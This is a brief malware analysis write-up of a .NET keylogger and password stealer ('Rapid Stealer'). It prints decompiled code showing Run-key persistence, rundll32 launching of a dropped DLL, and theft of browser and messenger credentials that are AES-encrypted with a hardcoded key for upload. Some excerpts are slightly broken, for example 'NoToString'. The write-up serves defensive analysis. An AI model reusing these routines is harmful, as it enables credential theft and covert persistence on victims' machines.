# [Quick Note] Analyze .NET sample e978503d4859ba8b171741163516ea75

# Overview
MD5: e978503d4859ba8b171741163516ea75
Any-run: https://any.run/report/6db0f23260293a85f051c8a7314489c3f375767821300664788c4e27214d01f1/0fd7729f-791d-4834-bbdb-710c3d701271 </br>

This sample have a name is ```Stealer``` or ```Rapid Stealer```, it's keylogger with a few function to steal data browser app, messenger app, proxy app, capture keyboard and capture screenshot. This sample developing by .NET language

# Analyze
Signature of this sample </br>
```
code-page:          Unicode UTF-16, little endian
Comments:           Process for Windows
CompanyName:        Microsoft
FileDescription:    Process for Windows
FileVersion:        1.0.0.0
InternalName:       Stealer.exe
LegalCopyright:     Copyright Â©  2013
OriginalFilename:   Stealer.exe
ProductName:        Process for Windows
ProductVersion:     1.0.0.0
Assembly Version:   1.0.0.0
```
Quick check on ```Main``` function, before start this sample created two files ```\\RapidStartTech.stl``` ```AppTransferWiz.dll``` and execute dll file firstly. </br>
```
		Program._appDataDirectory = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\IntelRapidStart";
		if (!Directory.Exists(Program._appDataDirectory))
		{
			Directory.CreateDirectory(Program._appDataDirectory);
		}
		Program._mustUploadDir = string.Format("{0}\\ume", Program._appDataDirectory);
		string path = Program._appDataDirectory + "\\RapidStartTech.stl";
		if (File.Exists(path))
		{
			string[] array = File.ReadAllLines(path);
			for (int i = 0; i < array.Length; i++)
			{
				array[i] = Base64.Decode(array[i]);
			}
			Program._startupEnabled = (array[6] == "True");
			Program._keyLoggerEnabled = (array[7] == "True");
			Program._screenshotEnabled = (array[8] == "True");
			Program._keyLoggerValue = int.Parse(array[9]);
			Program._keyLogIsLimitedBySize = (array[10] == "True");
			Program._screenInterval = int.Parse(array[12]);
			Program._screenCounter = int.Parse(array[13]);
			if (!Directory.Exists(Program._mustUploadDir))
			{
				Directory.CreateDirectory(Program._mustUploadDir);
			}
			Program.ExtractResources(Program._appDataDirectory);
			string text = string.Format("{0}\\{1}", Program._appDataDirectory, "AppTransferWiz.dll");
			if (File.Exists(text))
			{
				Process.Start("rundll32.exe", string.Format("\"{0}\",#110", text));
			}
```
After created and run sucessfully, this sample finding registry setup for startup of with OS of sample. If not existed, sample call functions ```SetStartup``` to setup into registry ```SOFTWARE\Microsoft\Windows\CurrentVersion\Run``` with key name ```IntelRapidStart``` </br>
```
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		text += string.Format("\\IntelRapidStart\\{0}", AppDomain.CurrentDomain.FriendlyName);
		RegistryKey currentRegistryKey = Program.GetCurrentRegistryKey();
		RegistryKey registryKey = currentRegistryKey.OpenSubKey(Base64.Decode("U09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu"), true);
		if (registryKey != null)
		{
			registryKey.SetValue(processName, text);
		}
```
When startup and setup successfully, sample will collect to data, password of browser app,  messenger app and compress it this data into files ```.Enc``` with encryption cipher is AES (RijndaelCrypto) </br>
```
        xmlWriter.WriteStartElement("BrowserPasswords");
        if (Program._isSqliteExist)
        {
        	Program.GetBrowserPasswords(xmlWriter, new Firefox());
        	Program.GetBrowserPasswords(xmlWriter, new Chrome());
        	Program.GetBrowserPasswords(xmlWriter, new Opera());

        {

        xmlWriter3.WriteStartElement("Messenger");
        Program.GetMessengerData(xmlWriter3, new Pidgin());
        Program.GetMessengerData(xmlWriter3, new YahooMessenger());
        Program.GetMessengerData(xmlWriter3, new Gtalk());
        Program.GetMessengerData(xmlWriter3, new Skype());
        xmlWriter3.WriteEndElement();
        }

        byte[] array2 = RijndaelCrypto.Encrypt(Program.PassStream.ToArray(), "HavijeBaba", "salam!*%#");
		string path2 = string.Format("{0}\\Pass_{1}_{2}.Enc", Program._mustUploadDir, Environment.MachineName, DateTime.NoToString("yyyyMMdd_hhmm"));
		if (array2 != null)
		{
			File.WriteAllBytes(path2, array2);
		}
```
